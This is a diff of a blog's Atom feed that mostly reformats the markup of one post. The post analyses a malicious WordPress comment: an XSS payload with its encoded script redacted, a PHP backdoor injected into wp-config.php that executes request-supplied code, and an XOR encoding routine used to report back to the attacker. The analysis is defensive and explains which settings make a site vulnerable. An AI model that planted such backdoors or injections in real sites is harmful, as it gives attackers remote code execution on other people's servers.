@@ -3,7 +3,7 @@
  <title>BrandonSilver.com</title>
  <link href="http://www.brandonsilver.com/atom.xml" rel="self"/>
  <link href="http://www.brandonsilver.com/"/>
- <updated>2015-05-29T01:32:04-05:00</updated>
+ <updated>2016-02-20T21:52:36-06:00</updated>
  <id>http://www.brandonsilver.com/</id>
  <author>
    <name>Brandon Silver</name>
@@ -18,15 +18,15 @@
    <id>http://www.brandonsilver.com/2015/01/07/exploring-malicious-wordpress-spam</id>
    <content type="html">&lt;p&gt;&lt;strong&gt;DISCLAIMER:&lt;/strong&gt; The contents of this post may contain code that is unsafe to run. The
 purpose of this post is purely exploratory and meant for defensive purposes, and not as an intro to
-1337 hax0ring. If you use the knowledge below for bad, don&amp;#39;t blame me when the feds&amp;#39; party van comes
+1337 hax0ring. If you use the knowledge below for bad, don’t blame me when the feds’ party van comes
 for you. Your actions are your own.&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;Last updated on 2014-01-07 17:25 CST&lt;/em&gt;&lt;/p&gt;
 
-&lt;h3&gt;Introduction&lt;/h3&gt;
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;I manage a few WordPress websites in my spare time. Most of the sites don&amp;#39;t have comments enabled,
-but a few do, so on occasion I&amp;#39;ll be alerted to new comments. The majority of those comments are
+&lt;p&gt;I manage a few WordPress websites in my spare time. Most of the sites don’t have comments enabled,
+but a few do, so on occasion I’ll be alerted to new comments. The majority of those comments are
 spam (usually having something to do with advertising SEO opportunities) and thus are left in the
 purgatory of the moderation queue. However, one would-be comment was different from the usual
 fake-SEO tripe. This post will examine this particular comment and explore its malicious properties.&lt;/p&gt;
@@ -35,12 +35,12 @@ fake-SEO tripe. This post will examine this particular comment and explore its m
 
 &lt;!--more--&gt;
 
-&lt;h3&gt;The raw comment&lt;/h3&gt;
+&lt;h3 id=&quot;the-raw-comment&quot;&gt;The raw comment&lt;/h3&gt;
 
 &lt;p&gt;This is the email notification I received when the comment was created. It includes the relevant
 metadata as well as the raw comment itself:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;A new comment on the post &amp;quot;Post&amp;quot; is waiting for your approval
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;A new comment on the post &quot;Post&quot; is waiting for your approval
 POST-URL
 
 Author : Wasia (IP: 50.63.194.123 , p3nlhg1391.shr.prod.phx3.secureserver.net)
@@ -48,171 +48,168 @@ E-mail : aaa@aaa.com
 URL    :
 Whois  : http://whois.arin.net/rest/ip/50.63.194.123
 Comment:
-Welcome to WordPress. This is your first post. [&amp;lt;a title=&amp;quot;]&amp;quot; rel=&amp;quot;nofollow&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;[\&amp;quot; &amp;lt;!--
-style=\&amp;#39;position:fixed;top:0px;left:0px;width:6000px;height:6000px;color:transparent;z-index:999999999\&amp;#39;
-onmouseover=&amp;quot;eval(atob(\&amp;#39;naughty-javascript-in-base-64-goes-here&amp;#39;))&amp;quot; &amp;amp;gt; --&amp;gt;&amp;lt;a&amp;gt;&amp;lt;/a&amp;gt;] Edit or delete it, then start blogging!
+Welcome to WordPress. This is your first post. [&amp;lt;a title=&quot;]&quot; rel=&quot;nofollow&quot;&amp;gt;&amp;lt;/a&amp;gt;[\&quot; &amp;lt;!--
+style=\&#39;position:fixed;top:0px;left:0px;width:6000px;height:6000px;color:transparent;z-index:999999999\&#39;
+onmouseover=&quot;eval(atob(\&#39;naughty-javascript-in-base-64-goes-here&#39;))&quot; &amp;amp;gt; --&amp;gt;&amp;lt;a&amp;gt;&amp;lt;/a&amp;gt;] Edit or delete it, then start blogging!
 
 Approve it: APPROVE-URL
 Trash it: TRASH-URL
 Spam it: SPAM-URL
 Currently 100 comments are waiting for approval. Please visit the moderation panel:
-PANEL-URL&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+PANEL-URL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;The comment appears to be setup to force anyone who visits the page it inhabits to run some
 obfuscated javascript (the large chunk of characters within the &lt;code&gt;eval(atob())&lt;/code&gt; ).&lt;/p&gt;
 
-&lt;h3&gt;De-obfuscating the comment&amp;#39;s JavaScript&lt;/h3&gt;
-
+&lt;h3 id=&quot;de-obfuscating-the-comments-javascript&quot;&gt;De-obfuscating the comment’s JavaScript&lt;/h3&gt;
 &lt;p&gt;De-obfuscation of the javascript is accomplished by decoding the block of characters inside of the
-atob() function call from base-64. It&amp;#39;s now clear that this script is trying to create an iframe on
-the page and fill it with the wordpress installation&amp;#39;s plugin editor in order to edit the
+atob() function call from base-64. It’s now clear that this script is trying to create an iframe on
+the page and fill it with the wordpress installation’s plugin editor in order to edit the
 &lt;code&gt;hello.php&lt;/code&gt; plugin. If the desired changes have already been made, then it will instead
 set the iframe to run the modified &lt;code&gt;hello.php&lt;/code&gt; script.&lt;/p&gt;
 
 &lt;p&gt;But what are those changes? I found the answer by decoding a base-64 string that was being added (in
 decoded form) to &lt;code&gt;hello.php&lt;/code&gt;. It turned out to be a chunk of PHP that serves to exploit
-incorrect file permission settings to allow for arbitrary remote code execution. &lt;/p&gt;
+incorrect file permission settings to allow for arbitrary remote code execution.&lt;/p&gt;
 
-&lt;h3&gt;Overview of the modifications to hello.php&lt;/h3&gt;
+&lt;h3 id=&quot;overview-of-the-modifications-to-hellophp&quot;&gt;Overview of the modifications to hello.php&lt;/h3&gt;
 
 &lt;p&gt;The main target of the attack appears to be &lt;code&gt;wp-config.php&lt;/code&gt;, a file that holds important
 settings for WordPress sites (like database access credentials). The script injects some code into
 &lt;code&gt;wp-config.php&lt;/code&gt; (reproduced in a more readable form below):&lt;/p&gt;
 
-&lt;h4&gt;Injection into wp-config.php&lt;/h4&gt;
+&lt;h4 id=&quot;injection-into-wp-configphp&quot;&gt;Injection into wp-config.php&lt;/h4&gt;
 
-&lt;table class=&quot;highlighttable&quot;&gt;&lt;tr&gt;&lt;td class=&quot;linenos&quot;&gt;&lt;div class=&quot;linenodiv&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;1
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;table style=&quot;border-spacing: 0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot; style=&quot;text-align: right&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
 2
 3
 4
 5
-6&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FILE&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;unique-value-here&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$_&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;FILE&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;($_);&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HOST&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+6&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;FILE&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;unique-value-here&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$_&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;FILE&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;($_);&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$_FILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;HOST&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;It appears that by adding this code the attacker can execute arbitrary code contained in a
-specially-crafted request to &lt;code&gt;wp-config.php&lt;/code&gt;. Specifically, any request with the &amp;#39;FILE&amp;#39;
+specially-crafted request to &lt;code&gt;wp-config.php&lt;/code&gt;. Specifically, any request with the ‘FILE’
 variable set will execute the code supplied by the request variable with the same name as a unique
 ID generated previously in the script. This provides the attacker with the ability to limit access
-to this exploit. &lt;/p&gt;
+to this exploit.&lt;/p&gt;
 
 &lt;p&gt;Next, the script moves to correct the permissions of &lt;code&gt;wp-config.php&lt;/code&gt; in order to prevent
 other attackers from gaining control (a consistent theme in this script, as will be shown below).
-Another consistent theme of this attack is the clever hiding of modified files&amp;#39; modification dates.
-This ensures that a simple directory listing doesn&amp;#39;t give away that the exploit has occurred. &lt;/p&gt;
+Another consistent theme of this attack is the clever hiding of modified files’ modification dates.
+This ensures that a simple directory listing doesn’t give away that the exploit has occurred.&lt;/p&gt;
 
-&lt;h4&gt;Phoning home: report()&lt;/h4&gt;
+&lt;h4 id=&quot;phoning-home-report&quot;&gt;Phoning home: report()&lt;/h4&gt;
 
 &lt;p&gt;In order for the attacker to make use of the now-compromised site, it is necessary for them to
 obtain the unique ID in the script. The &lt;code&gt;report()&lt;/code&gt; function sends that and the WordPress
-installation&amp;#39;s host to a hardcoded list of sites. The reporting action is accomplished via a series
+installation’s host to a hardcoded list of sites. The reporting action is accomplished via a series
 of HTTP GET requests containing this information as a URL parameter.&lt;/p&gt;
 
-&lt;h4&gt;Basic encryption: Uno_encode()&lt;/h4&gt;
+&lt;h4 id=&quot;basic-encryption-unoencode&quot;&gt;Basic encryption: Uno_encode()&lt;/h4&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Uno_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;dc5p9dOpBc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;dc5p9dOpBc&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$StrLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;DMEf5HZuPq&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;DMEf5HZuPq&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$StrLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;H*&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;H*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Gamma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;The data reported back to the attackers is first encrypted by the &lt;code&gt;Uno_encode()&lt;/code&gt;
-function. It&amp;#39;s notable because it doesn&amp;#39;t use a standard cryptosystem (like AES or RSA);
+function. It’s notable because it doesn’t use a standard cryptosystem (like AES or RSA);
 instead, it takes a much simpler approach by creating a sort of static key and then XORing it with
 the string to be encrypted. Decryption can be accomplished by sending the base-64 decoded ciphertext
 through the same function, like this:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Uno_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Uno_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Of course, this requires that you know the values for &lt;code&gt;$Salt&lt;/code&gt; and &lt;code&gt;$Seq&lt;/code&gt; (as
-well as the rest of the algorithm), so it&amp;#39;s reasonably secure as long as those secrets aren&amp;#39;t known.
+well as the rest of the algorithm), so it’s reasonably secure as long as those secrets aren’t known.
 Unfortunately for the attackers, now they &lt;em&gt;are&lt;/em&gt; known, and they now wish they had chosen an asymmetric
-algorithm instead (since exposing a public key wouldn&amp;#39;t have also exposed their communications).&lt;/p&gt;
+algorithm instead (since exposing a public key wouldn’t have also exposed their communications).&lt;/p&gt;
 
-&lt;h4&gt;Self-patching and self-removal&lt;/h4&gt;
+&lt;h4 id=&quot;self-patching-and-self-removal&quot;&gt;Self-patching and self-removal&lt;/h4&gt;
 
 &lt;p&gt;After modifying &lt;code&gt;wp-config.php&lt;/code&gt; and reporting back, the script takes steps to hide its
-tracks and secure the injected code&amp;#39;s place in the WordPress installation. First, it removes the
+tracks and secure the injected code’s place in the WordPress installation. First, it removes the
 original malicious comment from the MySQL database. Next, it patches the WordPress installation by
 modifying the &lt;code&gt;wp-comments-post.php&lt;/code&gt; file to completely block the posting of new
-comments. It&amp;#39;s definitely a sledgehammer approach to fixing the vulnerability used in this exploit,
-but it works as long as no one gets curious as to why new comments can&amp;#39;t be posted. Finally, the
+comments. It’s definitely a sledgehammer approach to fixing the vulnerability used in this exploit,
+but it works as long as no one gets curious as to why new comments can’t be posted. Finally, the
 script removes itself from &lt;code&gt;hello.php&lt;/code&gt;. It uses an MD5 hash value at the bottom of the script
-as a boundary marker to indicate where the malicious script ends and the original content begins. &lt;/p&gt;
+as a boundary marker to indicate where the malicious script ends and the original content begins.&lt;/p&gt;
 
-&lt;h3&gt;Summary&lt;/h3&gt;
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
 
 &lt;p&gt;This exploit originates as a comment designed to look like the default WordPress post. The first
-time it&amp;#39;s viewed it runs some JavaScript which adds the PHP previously described to a plugin,
+time it’s viewed it runs some JavaScript which adds the PHP previously described to a plugin,
 &lt;code&gt;hello.php&lt;/code&gt;. The second time the comment is viewed it executes the plugin, in turn
 running code that&lt;/p&gt;
 
 &lt;ol&gt;
-&lt;li&gt;injects more PHP into the WordPress installation&amp;#39;s settings file, &lt;code&gt;wp-config.php&lt;/code&gt;,&lt;/li&gt;
-&lt;li&gt;sends information back to the attackers (allowing them to execute
+  &lt;li&gt;injects more PHP into the WordPress installation’s settings file, &lt;code&gt;wp-config.php&lt;/code&gt;,&lt;/li&gt;
+  &lt;li&gt;sends information back to the attackers (allowing them to execute
 arbitrary code with a specially-crafted request using the injected code from 1.),&lt;/li&gt;
-&lt;li&gt;removes the comment, and&lt;/li&gt;
-&lt;li&gt;removes the malicious code added to &lt;code&gt;hello.php&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;removes the comment, and&lt;/li&gt;
+  &lt;li&gt;removes the malicious code added to &lt;code&gt;hello.php&lt;/code&gt;.&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h4&gt;Requirements for vulnerability&lt;/h4&gt;
+&lt;h4 id=&quot;requirements-for-vulnerability&quot;&gt;Requirements for vulnerability&lt;/h4&gt;
 
-&lt;p&gt;Now that I&amp;#39;ve gone through the exploit I think I can speculate as to what it would take for a
+&lt;p&gt;Now that I’ve gone through the exploit I think I can speculate as to what it would take for a
 WordPress site to be vulnerable to it. It seems to require the following to be true:&lt;/p&gt;
 
 &lt;ol&gt;
-&lt;li&gt;Commenting must be enabled&lt;/li&gt;
-&lt;li&gt;Commenting must be open to everyone&lt;/li&gt;
-&lt;li&gt;Comments must be automatically approved (no moderation queue)&lt;/li&gt;
-&lt;li&gt;The web server (or whatever entity is running WordPress) must be able to write to the WordPress
+  &lt;li&gt;Commenting must be enabled&lt;/li&gt;
+  &lt;li&gt;Commenting must be open to everyone&lt;/li&gt;
+  &lt;li&gt;Comments must be automatically approved (no moderation queue)&lt;/li&gt;
+  &lt;li&gt;The web server (or whatever entity is running WordPress) must be able to write to the WordPress
 installation directory&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;p&gt;Number 4 is the big one, since many folks installing WordPress themselves can make the easy mistake
 of using incorrect file system permissions.&lt;/p&gt;
 
-&lt;h3&gt;Final thoughts&lt;/h3&gt;
+&lt;h3 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h3&gt;
 
-&lt;p&gt;Something that struck me as odd was that there wasn&amp;#39;t an immediate attempt to exfiltrate the
-database access credentials. Wouldn&amp;#39;t a list of valid credentials be valuable?&lt;/p&gt;
+&lt;p&gt;Something that struck me as odd was that there wasn’t an immediate attempt to exfiltrate the
+database access credentials. Wouldn’t a list of valid credentials be valuable?&lt;/p&gt;
 
-&lt;h3&gt;BONUS -- A CONNECTION TO ANOTHER EXPLOIT?!&lt;/h3&gt;
+&lt;h3 id=&quot;bonus----a-connection-to-another-exploit&quot;&gt;BONUS – A CONNECTION TO ANOTHER EXPLOIT?!&lt;/h3&gt;
 
 &lt;p&gt;I got curious about the MD5 hash (&lt;code&gt;49de371511c1de3bde34b0108ec7f129&lt;/code&gt;) at the bottom of
 the PHP code that gets added to &lt;code&gt;hello.php&lt;/code&gt; and did some googling. &lt;a href=&quot;https://www.planetspork.com/w/2014/11/this-seems-interesting/&quot;&gt;This
 guy&lt;/a&gt; had someone try to use
-shellshock to add some PHP to his site, and as part of the PHP&amp;#39;s access control it compares the MD5
-of the requesting browser&amp;#39;s user agent to the MD5 hash value listed at the bottom of the PHP in this exploit.
+shellshock to add some PHP to his site, and as part of the PHP’s access control it compares the MD5
+of the requesting browser’s user agent to the MD5 hash value listed at the bottom of the PHP in this exploit.
 It seems that the same entity might be responsible for both exploits.&lt;/p&gt;
 
-&lt;h3&gt;References / Resources Used&lt;/h3&gt;
-
+&lt;h3 id=&quot;references--resources-used&quot;&gt;References / Resources Used&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.base64decode.org/&quot;&gt;Base-64 decoder&lt;/a&gt; to decode the base-64 strings&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://www.w3schools.com/jsref/met_win_atob.asp&quot;&gt;w3schools&lt;/a&gt; to brush up on basic JavaScript&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://php.net/manual/en/index.php&quot;&gt;The PHP Manual&lt;/a&gt; for a refresher on common PHP functions&lt;/li&gt;
